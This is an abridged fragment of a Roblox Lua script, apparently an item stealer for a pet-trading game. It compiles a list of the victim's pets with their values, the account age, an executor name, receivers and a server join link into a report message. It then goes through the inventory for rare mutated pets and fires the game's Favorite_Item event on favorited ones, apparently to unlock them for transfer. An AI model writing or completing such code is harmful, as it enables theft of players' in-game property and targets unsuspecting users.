...
local function SendJoinMessage(list, prefix)
    ...
    for _, item in ipairs(list) do
        if item.Type == "Pet" then
            local emoji = getPetEmoji(item.Name, item.Weight)
            table.insert(backpackLines, string.format("%s - %s [%.2f KG] [Age %s] → %s¢", emoji, item.Name, item.Weight, tostring(item.Age), formatNumber(item.Value)))
    ...
    -- Hits section (customize as needed)
    local hitsStr = "All Items"
    ...
    local joinUrlMarkdown = string.format("[%s](%s)", jobId, joinUrl)
...
-# %s | %s**
]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
            ...
            if petUUID and dataService and dataService.GetData then
                ...
                if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                    ...
                    if v14 then
                        ...
                        local petAge = tonumber(toolName:match("%[Age%s*(%d+)%]")) or "N/A"
                        ...
                        elseif hasMutation(itemName) and isRarePet(itemName, weight) then
                            -- Mutated rare pets
                            if tool:GetAttribute("Favorite") then
                                local success = pcall(function()
                                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
